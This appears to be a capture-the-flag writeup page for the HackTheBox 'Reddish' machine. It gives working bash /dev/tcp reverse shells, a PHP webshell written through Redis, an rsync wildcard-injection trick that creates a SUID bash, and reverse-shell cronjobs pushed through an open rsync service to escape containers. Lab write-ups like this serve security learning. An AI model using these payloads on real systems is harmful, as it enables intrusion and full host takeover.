@@ -1,0 +1,491 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="robots" content="index, follow">
+    <title>Reddish - Hexicon Archives</title>
+    <link rel="icon" type="image/x-icon" sizes="500x500" href="../favicon.png">
+    <link rel="stylesheet" href="../style.css">
+    <link rel="canonical" href="https://hexphased.github.io/hexicon-archives/machines/Reddish.html" />
+    <!-- Machine-specific metadata for SEO -->
+    <meta name="description" content="Detailed writeup for Reddish machine from HackTheBox - Insane difficulty level">
+    <meta name="keywords" content="HackTheBox, Reddish, Insane, CTF, writeup, cybersecurity, penetration testing, Hexicon">
+</head>
+<body>
+    <header>
+        <div class="container header-content">
+            <a href="../machines.html" class="logo">Machine writeups</a>
+            <div class="header-controls">
+                <a href="../index.html" class="htb-icon" title="Link to the main page">
+                    <img src="../favicon.png" alt="Archive" width="30" height="30">
+                </a>
+                <div class="hamburger-menu">
+                    <span></span>
+                    <span></span>
+                    <span></span>
+                </div>
+            </div>
+        </div>
+    </header>
+    
+    <div class="sidebar">
+        <div class="difficulty-buttons">
+            <button class="difficulty-btn" data-difficulty="easy">Easy</button>
+            <div class="machine-list" id="easy-machines">
+                <!-- Will be populated dynamically -->
+            </div>
+            
+            <button class="difficulty-btn" data-difficulty="medium">Medium</button>
+            <div class="machine-list" id="medium-machines">
+                <!-- Will be populated dynamically -->
+            </div>
+            
+            <button class="difficulty-btn" data-difficulty="hard">Hard</button>
+            <div class="machine-list" id="hard-machines">
+                <!-- Will be populated dynamically -->
+            </div>
+
+            <button class="difficulty-btn" data-difficulty="insane">Insane</button>
+            <div class="machine-list" id="insane-machines">
+                <!-- Will be populated dynamically -->
+            </div>
+        </div>
+    </div>
+    
+    <div class="backdrop"></div>
+    
+    <main class="container writeup-content">
+        <h1 class="writeup-title">Reddish</h1>
+        <div class="writeup-metadata">
+            <span class="difficulty insane">Insane</span>
+            <span class="date">May 29, 2025</span>
+        </div>
+        
+        <div class="writeup-container">
+            <div class="writeup-body">
+                <!-- Machine-specific content goes here -->
+                <p><img alt="pwned" src="../images/Reddish/pwned.png" /></p>
+<p>Reddish was a challenging multi-container Linux box that started with a single open port running a node.js service.
+Initial reconnaissance revealed a Node-Red instance accessible via a JSON endpoint, which I exploited by creating a malicious flow using the exec node to establish a reverse shell on the first container.</p>
+<p>From the Node-Red container, I discovered two internal subnets (172.18.0.x and 172.19.0.x) through manual enumeration.
+Using ligolo for network pivoting, I identified a redis service on 172.19.0.2 and a web server  on 172.19.0.4.
+By exploiting the redis instance, I created a PHP webshell that provided access to the database container and retrieved the user flag.</p>
+<p>Privilege escalation on the database container was achieved by exploiting a root cronjob that used rsync with wildcards.
+I created malicious files that caused the cronjob to generate a SUID bash binary, granting root access.
+As root, I discovered a third subnet (172.20.0.x) and deployed another ligolo agent for further pivoting.</p>
+<p>The final compromise involved exploiting an rsync service on the backup server (172.20.0.2) that exposed the entire filesystem.
+I overwrote a cronjob to establish a reverse shell, then mounted the host's filesystem partitions from within the backup container.
+By placing a final cronjob in the host's cron.d directory, I achieved root access on the underlying Reddish machine, completing the multi-layered container escape.</p>
+<h1>User flag</h1>
+<p>Nmap scan reveals only 1 active port with a service based on node.js.</p>
+<p><img alt="nmap" src="../images/Reddish/nmap.png" /></p>
+<h2>Reverse shell on the Node-Red container</h2>
+<p>I ran curl --head to see what service was running there, but I got a 404 error in return.</p>
+<p>Adding -X GET to my command resulted in a "Cannot GET" error, and adding -X POST returned something interesting.</p>
+<p><code>{"id":"162c50a3d77ffe81208129de48183e11","ip":"::ffff:10.10.14.157","path":"/red/{id}"}</code></p>
+<p>This looks like an endpoint of some sort, so I'll navigate to it in my browser.</p>
+<p><img alt="nodered" src="../images/Reddish/nodered.png" /></p>
+<p>Node-Red is a flow-based, low-code development tool for visual programming. I'll examine the nodes on the left side.</p>
+<p>There are many nodes to use, but the most dangerous(and useful) one lies at the bottom. With the exec node, I can construct a reverse shell that will connect back to my machine.</p>
+<p><img alt="nodes" src="../images/Reddish/nodes.png" /></p>
+<p>Here are the changes I made to the nodes:</p>
+<p>TCP input: Change type to <code>Connect to</code>, port to the listener port, and host to my machine's IP.</p>
+<p>Exec: No changes</p>
+<p>TCP Output: Change type to <code>Reply to TCP</code>.</p>
+<p>After that, I'll set up a netcat listener on my machine before clicking deploy.</p>
+<p><img alt="shell1" src="../images/Reddish/shell1.png" /></p>
+<h2>Enumeration of the Node-Red container</h2>
+<p>There are no tools I'm used to in this container. No netcat, no python, and it seems like I'm not even in a bash shell.</p>
+<p>It will be more difficult to progress like this, but it's not something that cannot be done.</p>
+<p><img alt="ipaddr" src="../images/Reddish/ipaddr.png" /></p>
+<p>This machine has access to two subnets, 172.18.0.x and 172.19.0.x. I can check which IPs are active with a simple loop.</p>
+<p><code>for i in $(seq 1 10); do ping -c 1 172.18.0.$i; done</code></p>
+<p><img alt="ping1" src="../images/Reddish/ping1.png" /></p>
+<p>Knowing that the Node-Red machine has an IP of 172.18.0.2 on this subnet, I can tell that there is one more machine with the IP of 172.18.0.1.</p>
+<p>Next, I'll run the same loop but this time for 172.19.0.x.</p>
+<p><img alt="ping2" src="../images/Reddish/ping2.png" /></p>
+<p>There are more hosts in the 172.19.0.x subnet. I'd like to enumerate them all, but I'll need to get a bash shell in order to transfer the necessary files.</p>
+<p><code>bash -c "bash -i &gt;&amp; /dev/tcp/10.10.14.157/9002 0&gt;&amp;1"</code></p>
+<p>I'll set up a netcat listener on port 9002.</p>
+<p><img alt="bashshell" src="../images/Reddish/bashshell.png" /></p>
+<p>Now I can transfer a ligolo agent onto the Node-Red machine.</p>
+<p><code>https://github.com/nicocha30/ligolo-ng</code></p>
+<p>On my machine, I'll run <code>nc -lnkvp &lt; agent 80</code>.</p>
+<p>And on the Node-Red machine, I'll run <code>cat &lt; /dev/tcp/IP/PORT &gt; agent</code></p>
+<p><img alt="agent" src="../images/Reddish/agent.png" /></p>
+<h2>Host enumeration with ligolo</h2>
+<p>Before I can proceed with ligolo, there's some setup that I need to do.</p>
+<p>I'll create a tun interface for ligolo to use.</p>
+<p><code>sudo ip tuntap add user kalin  mode tun ligolo</code></p>
+<p><code>sudo ip link set ligolo up</code></p>
+<p>Now I can run the ligolo proxy on my machine.</p>
+<p><code>ligolo-proxy -selfcert</code></p>
+<p>I don't need to worry about a cert here as this is a lab. In real tasks, it would be wise to use a certificate to mitigate the risk of someone snooping in on the data.</p>
+<p><img alt="ligoloproxy" src="../images/Reddish/ligoloproxy.png" /></p>
+<p>Next, I'll run the agent on the Node-Red machine. I'll make it connect back to my ligolo proxy.</p>
+<p><code>./agent -connect 10.10.14.157:11601 -ignore-cert</code></p>
+<p><img alt="session" src="../images/Reddish/session.png" /></p>
+<p>In order to access the subnets, I'll have to add them to my routes.</p>
+<p><code>sudo ip route add x.x.x.x/24 dev ligolo</code></p>
+<p><img alt="reachable" src="../images/Reddish/reachable.png" /></p>
+<p>Since I'm able to ping the hosts now, I should have no problems with running my usual tools against them.</p>
+<p><img alt="web" src="../images/Reddish/web.png" /></p>
+<p>Port 80 is open on 172.19.0.4.</p>
+<p><img alt="web2" src="../images/Reddish/web2.png" /></p>
+<p>And 6379(redis) is active on 172.19.0.2.</p>
+<h2>Reverse shell on the database container</h2>
+<p><img alt="weite" src="../images/Reddish/weite.png" /></p>
+<p>There's nothing interesting on the website, so I'll check out the source code.</p>
+<p><img alt="todo" src="../images/Reddish/todo.png" /></p>
+<p>I found this interesting TODO list in the code. If there is a connection between the website and the database container, I might be able to get a reverse shell.</p>
+<p>With that, I'll try connecting to redis on the database container from my box.</p>
+<p><code>redis-cli -h 172.19.0.2 -p 6379</code></p>
+<p><img alt="redis" src="../images/Reddish/redis.png" /></p>
+<p>(Note here: The IP addresses for these two services seem to switch after every restart of the box. Keep that in mind)</p>
+<p>I used these commands to create a webshell via redis.</p>
+<div class="codehilite"><pre><span></span><code><span class="nx">set</span><span class="w"> </span><span class="nx">access</span><span class="w"> </span><span class="s2">&quot;</span><span class="cp">&lt;?</span> <span class="nb">system</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">&#39;test&#39;</span><span class="p">]);</span> <span class="cp">?&gt;</span><span class="s2">&quot;</span>
+
+<span class="nx">config</span><span class="w"> </span><span class="nx">set</span><span class="w"> </span><span class="nx">dbfilename</span><span class="w"> </span><span class="nx">test</span><span class="p">.</span><span class="nx">php</span>
+
+<span class="nx">config</span><span class="w"> </span><span class="nx">set</span><span class="w"> </span><span class="nx">dir</span><span class="w"> </span><span class="o">/</span><span class="kd">var</span><span class="err">/www/html/</span>
+
+<span class="nx">save</span>
+</code></pre></div>
+
+<p>I can access it by going to <code>http://172.19.0.3/test.php/test=command</code></p>
+<p><img alt="webshell2" src="../images/Reddish/webshell2.png" /></p>
+<p>To get a reverse shell all the way from the database server onto my machine, I can use a ligolo listener.</p>
+<p><code>listener_add --addr 0.0.0.0:9004 --to 0.0.0.0:9004</code></p>
+<p>This will cause anything directed to port 9004(within the tunnel) to go straight to my machine on port 9004.</p>
+<p>I'll catch the burp request for my webshell, and I'll modify the command.</p>
+<div class="codehilite"><pre><span></span><code><span class="nf">POST</span> <span class="nn">/test.php?test=bash+-c+&quot;bash+-i+&gt;%26+/dev/tcp/172.19.0.4/9004+0&gt;%261&quot;</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<span class="na">Host</span><span class="o">:</span> <span class="l">172.19.0.3</span>
+<span class="na">Cache-Control</span><span class="o">:</span> <span class="l">max-age=0</span>
+<span class="na">Accept-Language</span><span class="o">:</span> <span class="l">en-US,en;q=0.9</span>
+<span class="na">Upgrade-Insecure-Requests</span><span class="o">:</span> <span class="l">1</span>
+<span class="na">User-Agent</span><span class="o">:</span> <span class="l">Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36</span>
+<span class="na">Accept</span><span class="o">:</span> <span class="l">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span>
+<span class="na">Accept-Encoding</span><span class="o">:</span> <span class="l">gzip, deflate, br</span>
+<span class="na">Connection</span><span class="o">:</span> <span class="l">keep-alive</span>
+</code></pre></div>
+
+<p>The bash command needs to be URLencoded within burp, otherwise, it will not work.</p>
+<p><img alt="dbshell" src="../images/Reddish/dbshell.png" /></p>
+<h2>Root on the database container</h2>
+<p>After some enumeration of the container, I found a cronjob that runs every few minutes as root.</p>
+<p><img alt="cron" src="../images/Reddish/cron.png" /></p>
+<div class="codehilite"><pre><span></span><code><span class="n">cd</span><span class="w"> </span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">html</span><span class="o">/</span><span class="n">f187a0ec71ce99642e4f0afbd441a68b</span>
+<span class="n">rsync</span><span class="w"> </span><span class="o">-</span><span class="n">a</span><span class="w"> </span><span class="o">*.</span><span class="n">rdb</span><span class="w"> </span><span class="n">rsync</span><span class="p">:</span><span class="o">//</span><span class="n">backup</span><span class="p">:</span><span class="mi">873</span><span class="o">/</span><span class="n">src</span><span class="o">/</span><span class="n">rdb</span><span class="o">/</span>
+<span class="n">cd</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">rm</span><span class="w"> </span><span class="o">-</span><span class="n">rf</span><span class="w"> </span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">html</span><span class="o">/*</span>
+<span class="n">rsync</span><span class="w"> </span><span class="o">-</span><span class="n">a</span><span class="w"> </span><span class="n">rsync</span><span class="p">:</span><span class="o">//</span><span class="n">backup</span><span class="p">:</span><span class="mi">873</span><span class="o">/</span><span class="n">src</span><span class="o">/</span><span class="n">backup</span><span class="o">/</span><span class="w"> </span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">html</span><span class="o">/</span>
+<span class="n">chown</span><span class="w"> </span><span class="n">www</span><span class="o">-</span><span class="n">data</span><span class="o">.</span><span class="w"> </span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">html</span><span class="o">/</span><span class="n">f187a0ec71ce99642e4f0afbd441a68b</span>
+</code></pre></div>
+
+<p>This script uses rsync to copy any file with a .rdb extension from the f18 dir, presumably onto a backup server since it's rsync.</p>
+<p>It then removes everything in the html directory, and restores it from the backup server.</p>
+<p><img alt="gtfobins" src="../images/Reddish/gtfobins.png" /></p>
+<p>Since there is a wildcard used, I can make the cronjob execute a specially crafted file, with the goal of obtaining a SUID copy of bash.</p>
+<div class="codehilite"><pre><span></span><code>echo &quot;cp /bin/bash /tmp/test&quot; &gt; test.rdb
+
+echo &quot;chmod 4755 /tmp/test&quot; &gt;&gt; test.rdb
+
+echo &quot;&quot; &gt; &quot;-e sh test.rdb&quot;
+</code></pre></div>
+
+<p>I ended up using a one-liner to make everything quicker.</p>
+<div class="codehilite"><pre><span></span><code>touch -- test.rdb &amp;&amp; echo &quot;cp /bin/bash /tmp/test&quot; &gt; test.rdb &amp;&amp; echo &quot;chmod 4755 /tmp/test&quot; &gt;&gt; test.rdb &amp;&amp; echo &quot;&quot; &gt; &quot;-e sh test.rdb&quot;
+</code></pre></div>
+
+<p>I then waited until the two files were gone from the f18 directory, and as soon as they were...</p>
+<p><img alt="rootdb" src="../images/Reddish/rootdb.png" /></p>
+<p>I could get a root shell via the newly created SUID bash.</p>
+<p>In the /home directory, I found two user homes and in one of them, I found the user flag.</p>
+<h1>Root flag</h1>
+<p>As the root user on the database container, I will proceed with further enumeration.</p>
+<h2>Setting up a ligolo agent on the database machine</h2>
+<p><img alt="newsubnet" src="../images/Reddish/newsubnet.png" /></p>
+<p>The database machine is a part of the 172.20.0.x subnet. Since this is a new one, I will perform similar steps </p>
+<p>I transferred a ligolo agent from the Node-Red machine onto the database machine using a statically compiled version of ncat.</p>
+<p><code>wget https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/ncat</code></p>
+<p>I then created a different listener on my ligolo proxy.</p>
+<p><code>listener_add --addr 0.0.0.0:11601 --to 0.0.0.0:11601</code></p>
+<p>Lastly, I ran the agent bin on the database machine and directed it to the Node-Red machine.</p>
+<p><code>./agent -connect 172.19.0.4:11601 -ignore-cert</code></p>
+<p>The connection was successful, but in order to make a tunnel, I'll need to create a second interface for ligolo.</p>
+<div class="codehilite"><pre><span></span><code>sudo ip tuntap add user kalin mode tun ligolo2
+
+sudo ip link set ligolo2 up
+</code></pre></div>
+
+<p>I'll also add the 172.20.0.0 route to the new interface.</p>
+<p><code>sudo ip route add 172.20.0.0/24 dev ligolo2</code></p>
+<p>Now I can start the second tunnel with the --tun ligolo2 flag.</p>
+<p><img alt="tunnels" src="../images/Reddish/tunnels.png" /></p>
+<h2>Reverse shell on the backup machine</h2>
+<p>I'll start by scanning the subnet for any mention of rsync. Since the script was backing up data somewhere, and this is a new subnet, It's almost guaranteed that It'll be found here.</p>
+<p><img alt="backupserv" src="../images/Reddish/backupserv.png" /></p>
+<p>Sure enough, the backup server is located at 172.20.0.2. I'll search for a way to abuse rsync that could grant me a reverse shell.</p>
+<p><img alt="rsync" src="../images/Reddish/rsync.png" /></p>
+<p>I can view the entire filesystem of the backup server. I'll check whether I can download the files as well.</p>
+<p><img alt="shadow" src="../images/Reddish/shadow.png" /></p>
+<p>I copied over the cron.d directory from the backup server.</p>
+<p><img alt="cronsync" src="../images/Reddish/cronsync.png" /></p>
+<p>It contains a single cleanup script and a placeholder.</p>
+<p><code>* * * * * root rm -rf /rdb/*</code></p>
+<p>It's a simple command that removes everything in the directory. My first thought was to overwrite this cronjob with a reverse shell, so I'll try doing just that.</p>
+<p>I used rsync to overwrite the cronjob with a bash reverse shell and set up a listener back on my machine, but it never connected back.</p>
+<p>Instead, I decided to transfer ncat onto the DB machine and set up a listener there.</p>
+<p>I wrote a new cronjob that would connect back to ncat on the DB machine.</p>
+<p><code>echo '* * * * * root bash -c "bash -i &gt;&amp; /dev/tcp/172.20.0.3/9005 0&gt;&amp;1"' &gt; clean</code></p>
+<p>I used rsync to push the change onto the backup server, and almost immediately got a callback.</p>
+<p><code>rsync -avp clean rsync://backup:873/src/etc/cron.d/clean</code></p>
+<p><img alt="backupshell" src="../images/Reddish/backupshell.png" /></p>
+<h2>Reverse shell on reddish</h2>
+<p><img alt="ipaddr1" src="../images/Reddish/ipaddr1.png" /></p>
+<p>There are no more subnets to enumerate, which means I must be close to finishing the box.</p>
+<p>In the /dev directory, I found a bunch of unmounted partitions.</p>
+<p><img alt="sda" src="../images/Reddish/sda.png" /></p>
+<p>I mounted them all and found out that sda2 holds the reddish filesystem.</p>
+<p><img alt="sda2" src="../images/Reddish/sda2.png" /></p>
+<p>However, I'd like to get a reverse shell on the last machine. It'll be easy to do so since I can just put a cronjob into the /etc/cron.d directory in sda2.</p>
+<p><code>echo '* * * * * root bash -c "bash -i &gt;&amp; /dev/tcp/172.20.0.2/9007 0&gt;&amp;1"' &gt; clean</code></p>
+<p>I once again moved ncat, this time to the backup server.</p>
+<p>After copying the cronjob into the cron.d directory, I ran ncat and received the shell after a few seconds.</p>
+<p><img alt="root" src="../images/Reddish/root.png" /></p>
+<p>Rooted!</p>
+            </div>
+            
+            <div class="toc-sidebar">
+                <h3>Contents</h3>
+                <ul id="toc-list">
+                    <!-- This will be populated by JavaScript -->
+                </ul>
+            </div>
+        </div>
+    </main>
+    
+    <!-- Mobile TOC toggle button -->
+    <button class="toc-toggle" aria-label="Toggle table of contents">
+        ≡
+    </button>
+    
+    <footer>
+        <div class="container">
+            <p>&copy; 2025 Hexicon Archives | Created by Hexicon</p>
+        </div>
+    </footer>
+
+    <!-- Include the Markdown parser (not needed for static HTML) -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/marked/4.3.0/marked.min.js"></script>
+    
+    <script>
+        // Machine metadata for sidebar population
+        let machineData = {};
+        
+        // Function to initialize the application
+        async function initializeApp() {
+            try {
+                // Fetch machine metadata
+                const response = await fetch('../machines.json');
+                if (!response.ok) {
+                    throw new Error('Failed to load machine metadata');
+                }
+                machineData = await response.json();
+                
+                // Populate the sidebar with machine links
+                populateSidebar();
+                
+                // Generate table of contents
+                generateTableOfContents();
+            } catch (error) {
+                console.error('Initialization error:', error);
+                showError("Failed to initialize application. Please refresh and try again.");
+            }
+        }
+
+        // Call the initialization function when the page loads
+        document.addEventListener('DOMContentLoaded', initializeApp);
+
+        // Populate sidebar with machine links dynamically
+        function populateSidebar() {
+            const categories = {
+                "easy": document.getElementById("easy-machines"),
+                "medium": document.getElementById("medium-machines"),
+                "hard": document.getElementById("hard-machines"),
+                "insane": document.getElementById("insane-machines")
+            };
+
+            // Clear existing links
+            for (const category of Object.values(categories)) {
+                category.innerHTML = '';
+            }
+
+            // Add machine links to appropriate categories
+            for (const [machineName, data] of Object.entries(machineData)) {
+                const difficulty = data.difficulty.toLowerCase();
+                if (categories[difficulty]) {
+                    const link = document.createElement('a');
+                    link.href = `../machines/${machineName}.html`;
+                    link.textContent = data.title;
+                    
+                    // Highlight current machine
+                    if (data.title === "Reddish") {
+                        link.classList.add('active');
+                    }
+                    
+                    categories[difficulty].appendChild(link);
+                }
+            }
+        }
+
+        // Generate table of contents from headings
+        function generateTableOfContents() {
+            const writeupBody = document.querySelector('.writeup-body');
+            const tocList = document.getElementById('toc-list');
+            const headings = writeupBody.querySelectorAll('h1, h2, h3');
+            
+            // Clear existing TOC
+            tocList.innerHTML = '';
+            
+            headings.forEach((heading, index) => {
+                // Create an ID for the heading if it doesn't have one
+                if (!heading.id) {
+                    // Convert heading text to kebab-case for ID
+                    const headingText = heading.textContent.trim();
+                    const headingId = headingText
+                        .toLowerCase()
+                        .replace(/[^\w\s-]/g, '')
+                        .replace(/\s+/g, '-');
+                    
+                    heading.id = headingId || `section-${index}`;
+                }
+                
+                // Create a list item for the TOC
+                const listItem = document.createElement('li');
+                const link = document.createElement('a');
+                link.href = `#${heading.id}`;
+                link.textContent = heading.textContent;
+                
+                // Add a class for h2 elements to create indentation
+                if (heading.tagName === 'H2') {
+                    listItem.classList.add('sub-heading');
+                    listItem.style.paddingLeft = '15px';
+                } else if (heading.tagName === 'H3') {
+                    listItem.classList.add('sub-sub-heading');
+                    listItem.style.paddingLeft = '30px';
+                }
+                
+                listItem.appendChild(link);
+                tocList.appendChild(listItem);
+            });
+            
+            // Set up scroll highlighting
+            setupScrollHighlighting();
+        }
+
+        // Highlight active TOC section on scroll
+        function setupScrollHighlighting() {
+            const tocLinks = document.querySelectorAll('.toc-sidebar a');
+            
+            function highlightActiveSection() {
+                // Find which section is currently in view
+                const fromTop = window.scrollY + 120;
+                
+                tocLinks.forEach(link => {
+                    const section = document.querySelector(link.hash);
+                    
+                    if (section && 
+                        section.offsetTop <= fromTop &&
+                        section.offsetTop + section.offsetHeight > fromTop) {
+                        link.classList.add('active');
+                    } else {
+                        link.classList.remove('active');
+                    }
+                });
+            }
+            
+            // Call initially and on scroll
+            window.addEventListener('scroll', highlightActiveSection);
+            highlightActiveSection();
+        }
+
+        // Show error message
+        function showError(message) {
+            const contentArea = document.querySelector('.writeup-body');
+            contentArea.innerHTML = `
+                <div class="error-message">
+                    <h2>Error</h2>
+                    <p>${message}</p>
+                </div>
+            `;
+        }
+
+        // Initialize the page
+        document.addEventListener('DOMContentLoaded', function() {
+            // Hamburger menu functionality
+            const hamburgerMenu = document.querySelector('.hamburger-menu');
+            const sidebar = document.querySelector('.sidebar');
+            const backdrop = document.querySelector('.backdrop');
+            
+            hamburgerMenu.addEventListener('click', () => {
+                hamburgerMenu.classList.toggle('active');
+                sidebar.classList.toggle('active');
+                backdrop.classList.toggle('active');
+            });
+            
+            backdrop.addEventListener('click', () => {
+                hamburgerMenu.classList.remove('active');
+                sidebar.classList.remove('active');
+                backdrop.classList.remove('active');
+                tocSidebar.classList.remove('active');
+            });
+            
+            // Difficulty buttons functionality
+            const difficultyButtons = document.querySelectorAll('.difficulty-btn');
+            
+            difficultyButtons.forEach(button => {
+                button.addEventListener('click', () => {
+                    const difficulty = button.getAttribute('data-difficulty');
+                    const machineList = document.querySelector(`#${difficulty}-machines`);
+                    
+                    machineList.classList.toggle('active');
+                });
+            });
+            
+            // Mobile TOC toggle
+            const tocToggle = document.querySelector('.toc-toggle');
+            const tocSidebar = document.querySelector('.toc-sidebar');
+            
+            tocToggle.addEventListener('click', () => {
+                tocSidebar.classList.toggle('active');
+                backdrop.classList.toggle('active');
+            });
+            
+            // Close TOC sidebar when clicking on a link (mobile)
+            document.querySelectorAll('.toc-sidebar a').forEach(link => {
+                link.addEventListener('click', () => {
+                    if (window.innerWidth <= 1024) {
+                        tocSidebar.classList.remove('active');
+                        backdrop.classList.remove('active');
+                    }
+                });
+            });
+        });
+
+        // Add smooth scrolling for TOC links
+        document.addEventListener('click', function(e) {
+            if (e.target.tagName === 'A' && e.target.hash) {
+                const element = document.querySelector(e.target.hash);
+                if (element) {
+                    e.preventDefault();
+                    window.scrollTo({
+                        top: element.offsetTop - 90,
+                        behavior: 'smooth'
+                    });
+                }
+            }
+        });
+    </script>
+</body>
+</html>
